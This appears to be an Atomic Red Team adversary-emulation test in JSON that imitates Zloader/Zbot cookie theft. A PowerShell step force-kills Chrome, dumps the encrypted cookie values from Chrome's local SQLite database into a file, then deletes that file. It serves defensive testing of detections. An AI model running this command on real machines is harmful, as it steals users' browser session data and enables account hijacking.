{
  "id": "26a6b840-4943-4965-8df5-ef1f9a282440",
  "name": "Steal Chrome Cookies (Windows)",
  "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "f98101f2-7406-4c2e-9d57-d84393b9f9f1",
      "type": "execute-command",
      "data": {
        "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "bb336ce1-095b-4fcc-97e1-fa0eb04e8a05",
      "type": "execute-command",
      "data": {
        "command": "remove-item #{output_file}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "52abd573-4fcc-4b04-81ed-534d990836cd",
      "name": "Check dependency 1/1",
      "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "fdd19560-9f90-4592-8176-5782e7031441",
      "name": "Resolve dependency 1/1",
      "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b73b5200-60e8-4c62-9d46-fb5da80b101d",
      "name": "Re-check dependency 1/1",
      "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "f98101f2-7406-4c2e-9d57-d84393b9f9f1",
      "p": "on-success",
      "o": "bb336ce1-095b-4fcc-97e1-fa0eb04e8a05"
    },
    {
      "s": "f98101f2-7406-4c2e-9d57-d84393b9f9f1",
      "p": "on-failure",
      "o": "bb336ce1-095b-4fcc-97e1-fa0eb04e8a05"
    },
    {
      "s": "52abd573-4fcc-4b04-81ed-534d990836cd",
      "p": "on-success",
      "o": "f98101f2-7406-4c2e-9d57-d84393b9f9f1"
    },
    {
      "s": "52abd573-4fcc-4b04-81ed-534d990836cd",
      "p": "on-failure",
      "o": "fdd19560-9f90-4592-8176-5782e7031441"
    },
    {
      "s": "fdd19560-9f90-4592-8176-5782e7031441",
      "p": "on-success",
      "o": "b73b5200-60e8-4c62-9d46-fb5da80b101d"
    },
    {
      "s": "b73b5200-60e8-4c62-9d46-fb5da80b101d",
      "p": "on-failure",
      "o": "f98101f2-7406-4c2e-9d57-d84393b9f9f1"
    }
  ],
  "tags": [
    "T1539",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "cookie_db",
      "type": "string",
      "description": "Filepath for Chrome cookies database",
      "value": "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    },
    {
      "name": "sqlite3_path",
      "type": "path",
      "description": "Path to sqlite3",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
    },
    {
      "name": "output_file",
      "type": "path",
      "description": "Filepath to output cookies",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"
    }
  ]
}